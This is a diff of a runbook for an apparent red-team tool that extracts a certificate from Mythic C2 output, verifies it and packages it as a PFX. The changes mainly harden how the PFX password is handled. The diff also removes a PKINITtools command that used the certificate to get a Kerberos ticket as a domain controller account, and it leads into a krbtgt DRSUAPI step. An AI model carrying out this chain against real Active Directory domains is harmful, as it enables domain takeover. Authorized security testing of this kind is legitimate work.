@@ -30,10 +30,10 @@ After exporting the complete Mythic output to a local file:
 python3 -m tools.certighost_operator extract \
   --run-dir '<NEW_EPHEMERAL_RUN_DIRECTORY>' \
   --mythic-output '<EXPORTED_MYTHIC_OUTPUT_FILE>' \
-  --pfx-password '<TRANSIENT_PFX_PASSWORD>'
+  --pfx
 ```
 
-`extract` stores the captured output inside the marked run directory, rejects malformed or non-issued results, writes the issued certificate locally, and succeeds only when OpenSSL proves the certificate public key matches the run private key. The PFX is optional and remains a transient local secret.
+`extract` stores the captured output inside the marked run directory, rejects malformed or non-issued results, writes the issued certificate locally, and succeeds only when OpenSSL proves the certificate public key matches the run private key. `--pfx` optionally creates a transient local PFX and prompts twice for its password with hidden input. For non-interactive use, choose `--pfx-password-file '<0600_PASSWORD_FILE>'` or redirect a protected password file into `--pfx-password-stdin`; never put the PFX password on argv.
 
 ```sh
 python3 -m tools.certighost_operator cleanup \
@@ -115,25 +115,16 @@ Preserve the Mythic task ID and output IDs as evidence, but do not place them in
 python3 -m tools.certighost_operator extract \
   --run-dir '<NEW_EPHEMERAL_RUN_DIRECTORY>' \
   --mythic-output '<EXPORTED_MYTHIC_OUTPUT_FILE>' \
-  --pfx-password '<TRANSIENT_PFX_PASSWORD>'
+  --pfx
 ```
 
-The command copies the exported output into the marked run directory, parses only the documented Certighost framing, writes `issued-cert.der` and `issued-cert.pem`, compares OpenSSL SHA-256 SPKI digests for the certificate and private key, and optionally creates `issued-cert.pfx`. It fails closed on malformed output, non-issued disposition, invalid DER, missing key continuity, unmarked directories, or symlinks.
+The command copies the exported output into the marked run directory, parses only the documented Certighost framing, writes `issued-cert.der` and `issued-cert.pem`, compares OpenSSL SHA-256 SPKI digests for the certificate and private key, and optionally creates `issued-cert.pfx`. Choose exactly one PFX mode: `--pfx` uses a hidden password-and-confirmation prompt, `--pfx-password-file` accepts only a regular file with no group or other permission bits, and `--pfx-password-stdin` reads one password line from redirected stdin. It fails closed on malformed output, non-issued disposition, invalid DER, missing key continuity, unmarked directories, symlinks, or an already completed certificate extraction.
 
-### 6. External PKINIT Example
+### 6. External PKINIT Handoff
 
-PKINIT stays external to this repository. After a successful `extract`, an approved external harness can consume the transient PFX. One narrowly scoped example using PKINITtools is:
+PKINIT stays external to this repository. After a successful `extract`, hand the transient PFX only to an approved external harness that accepts a protected password file, redirected stdin, or its own hidden prompt. Do not translate the PFX password back into an argv-only invocation. The exact external command is intentionally omitted because this repository does not own that password transport.
 
-```sh
-export KRB5CCNAME='<NEW_EPHEMERAL_RUN_DIRECTORY>/target-dc.ccache'
-python3 '<APPROVED_PKINITTOOLS_DIRECTORY>/gettgtpkinit.py' \
-  -cert-pfx '<NEW_EPHEMERAL_RUN_DIRECTORY>/issued-cert.pfx' \
-  -pfx-pass '<TRANSIENT_PFX_PASSWORD>' \
-  '<AD_REALM>/<TARGET_DC_NETBIOS>$' \
-  "$KRB5CCNAME"
-```
-
-Retain only sanitized success metadata such as the principal and whether a TGT was obtained. Keep the ccache ephemeral and out of reports and commits.
+Retain only sanitized success metadata such as the principal and whether a TGT was obtained. Keep any ccache ephemeral and out of reports and commits.
 
 ### 7. Prove Krbtgt-Only DRSUAPI Authority
 
